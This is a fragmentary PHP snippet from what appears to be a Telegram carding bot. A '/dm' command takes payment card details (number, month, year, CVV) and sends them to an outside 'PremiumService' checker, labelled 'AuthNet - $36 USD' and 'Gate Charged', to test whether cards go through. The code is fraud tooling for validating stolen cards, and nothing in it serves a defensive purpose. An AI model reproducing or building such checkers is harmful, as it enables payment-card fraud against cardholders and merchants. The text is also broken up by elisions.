...
if($cmd == "/dm" or $cmd == ".dm" or $cmd == "!dm"){
$NameGater ='Deimos';
$gateway = '/dm :'.$NameGater;
...
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>AuthNet - $36 USD</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!dm card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}
...
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-AuthNet - $36 USD
━━━━━━━━━━━━━━━━
...
$json = $curl::Post('https://gfr.4p15f0rchk.work/PremiumService/',$data = 'type=Check&Card='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'&Route=AuthNet_36_2', $headers)->body;
